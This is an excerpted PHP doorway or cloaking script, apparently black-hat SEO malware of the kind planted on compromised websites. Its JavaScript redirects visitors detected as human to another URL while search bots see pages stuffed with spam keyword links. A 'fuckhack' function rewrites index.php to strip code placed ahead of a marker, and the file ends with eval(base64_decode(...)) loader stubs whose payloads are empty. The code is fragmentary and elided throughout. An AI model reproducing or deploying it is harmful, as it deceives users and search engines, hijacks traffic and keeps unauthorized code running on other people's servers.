...
<script language=javascript>
	...
	if (is_bot==0) {
		...
		if (typeof(window.panic_redirect) == \'function\') {
			panic_redirect("'.$o.'&sref="+r);
		} else {
			window.location=encodeURI("'.$u.$o.'&sref="+r);
		}
	}
</script>
';
...
<script language=javascript>
function '.$H.'() {
	window.location=encodeURI("'.$u.$o.'&sref="+document.referrer);
}
function '.$T.'() {
	'.$H.'();
}
...
<rss version="2.0">
  <channel>
	...
	$items = str_replace('[Domain]',$config['www_domain'],
		str_replace('[Dir]', $config['path'], $items)
	);
...
function mk_tmpl($template) {
	global $ukey, $config, $kid, $mycheck, $check, $suspend_time, $Video;
	mt_srand($ukey);
	...
	$template = str_replace('rss.xml', $config['path'].'/index.php?page=rss', $template);
	...
	foreach($mcrs[0] as $key => $mcr) {
		...
		for($i=1; $i<=min($cs[1], $config['c_keywords']); $i++) {
			...
			$link.='<a href="'.$config['path'].'/index.php?page='.$config['NAMES'][$r].'" title="'.ucfirst($config['keywords'][$r]).'">'.ucfirst($config['keywords'][$r]).'</a>'.$cs[2];
		}
	...
	foreach($mcrs[0] as $mcr) {
		...
		preg_match("/_(.*?)\]/", $mcr, $tmp);
		for($i=0;$i<$config['c_keywords'];$i++)
			$map.='<a href="'.$config['path'].'/index.php?page='.$config['NAMES'][$i].'" title="'.ucfirst($config['keywords'][$i]).'">'.ucfirst($config['keywords'][$i]).'</a>'.$tmp[1]."\n";
	...
	if (count($TAGS)>3) {
		...
		foreach($mcrs[0] as $key => $mcr) {
			...
			foreach (rand_arr(array_keys($TAGS), mt_rand(3,7)) as $k =>$v ) {
				$tag.= '<strong><a rel="tag" href="'.$config['path'].'/index.php?tag='.$v.'">'.$v.'</a></strong>, ';
	...
	$template = preg_replace("/\[.*?]/", '',
  	  str_replace('[Link_map]', '<a href="'.$config['path'].'/index.php?page=map">Map</a>',
	    str_replace('[Link_index]', '<a href="'.$config['path'].'/">'.ucfirst($config['keywords'][0]).'</a>',
		  str_replace('[Key_main]',ucfirst($config['keywords'][0]),
		    str_replace('[Key_pag]',ucfirst($config['keywords'][$kid]),
		      preg_replace("/\[MetaDesc]/", trim(substr(ucfirst($kid?$config['keywords'][$kid].' - '.$config['keywords'][0]:$config['keywords'][0]).'. '. gen_text('A',100,50,1),0, 120)).'.',
	...
	switch ($ttype) {
		...
		case 'ag':
			...
			$template = str_replace('__AGREDIRECT_CALL__', $H.'()',
				str_replace('__AGREDIRECT_EXIT__', $T.'()', $template)
			);
			break;
...
function parse_config() {
	global $config;
	$config = unserialize(implode('', gzfile('config')));
...
function fuckhack() {
	if (is_writable('index.php')) {
		$s = implode('', file('index.php'));
		if(preg_match_all('/^.+?#busldhfslfhslms/is',$s,$a))
			foreach($a[0] as $v)
				$s=str_replace($v,"<?php\n#busldhfslfhslms",$s);
		$f = fopen('index.php', 'w');
		fwrite($f, $s);
...
<?php eval(html_entity_decode(base64_decode(""))); ?><?php eval(html_entity_decode(base64_decode(""))); ?>